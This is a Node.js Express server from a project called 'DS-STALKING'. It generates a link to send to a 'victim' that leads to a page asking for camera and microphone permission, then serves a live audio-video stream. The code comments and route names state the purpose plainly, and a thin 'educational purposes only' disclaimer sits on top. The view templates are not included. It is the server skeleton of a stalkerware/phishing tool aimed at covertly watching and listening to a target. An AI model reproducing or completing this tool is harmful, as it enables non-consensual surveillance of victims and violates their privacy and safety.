/*
 * New Version Re_Coded By HACKER1609
 * Call me : Famous-Tech
 * Author : This Script is the property of DEDSEC (DS)
 * Contact : assistantdedsec@gmail.com || famoustechht@gmail.com
 * 
 * Description : This script is part of the DS-STALKING project, designed for educational purposes only.
 * Use responsibly and ensure compliance with local laws and regulations.
 */

const express = require('express');
const app = express();
const http = require('http').Server(app);
const figlet = require('figlet');
const os = require('os');
const path = require('path');
const portfinder = require('portfinder'); // Pour trouver un port disponible

// Middleware pour parser les formulaires
app.use(express.urlencoded({ extended: true }));

// Configurer EJS comme moteur de template
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Fonction pour afficher l'interface ASCII
function displayInterface() {
    figlet('DS-STALKING', { font: 'Small' }, (err, data) => {
        if (err) {
            console.log('Something went wrong...');
            console.dir(err);
            return;
        }
        const info = [
            "BY: 2806",
            "Telegram: t.me/Mr_2806",
            "Tiktok: dedsec_x.0",
            "Youtube: Dedsec assistant",
            "Recoded by: 1609",
            "Call me : Famous-Tech"
        ];
        const border = "=".repeat(40);
        console.log(border);
        console.log(data);
        info.forEach(line => console.log(`  ${line}`));
        console.log(border);
    });
}

// Afficher l'interface ASCII au démarrage
displayInterface();

// Obtenir l'adresse IP locale
function getLocalIP() {
    const ifaces = os.networkInterfaces();
    let localIP = '127.0.0.1';
    Object.keys(ifaces).forEach(ifname => {
        ifaces[ifname].forEach(iface => {
            if (iface.family === 'IPv4' && !iface.internal) {
                localIP = iface.address;
            }
        });
    });
    return localIP;
}

// Route pour la page principale
app.get('/', (req, res) => {
    res.render('index'); // Appel au fichier index.ejs
});

// Route pour générer le lien à envoyer à la victime
app.post('/generate_victim_link', (req, res) => {
    const inputLink = req.body.input_link;
    const localIP = getLocalIP();
    portfinder.getPort((err, port) => {
        if (err) throw err;
        const victimLink = `http://${localIP}:${port}/victim_permission`;
        res.render('generated_link', { victimLink }); // Appel au fichier generated_link.ejs
    });
});

// Route pour la page de demande d'autorisation de la caméra et du micro
app.get('/victim_permission', (req, res) => {
    res.render('victim_permission'); // Appel au fichier victim_permission.ejs
});

// Route pour démarrer le flux après l'autorisation de la victime
app.post('/start_stream', (req, res) => {
    const localIP = getLocalIP();
    portfinder.getPort((err, port) => {
        if (err) throw err;
        const streamUrl = `http://${localIP}:${port}/stream`;
        res.json({ stream_url: streamUrl });
    });
});

// Route pour afficher le flux vidéo et audio
app.get('/stream', (req, res) => {
    res.render('stream'); // Appel au fichier stream.ejs
});

// Démarrer le serveur
portfinder.getPort((err, port) => {
    if (err) throw err;
    const localIP = getLocalIP();
    console.log(`Serveur en cours d'exécution : http://${localIP}:${port}`);
    http.listen(port, () => {});
});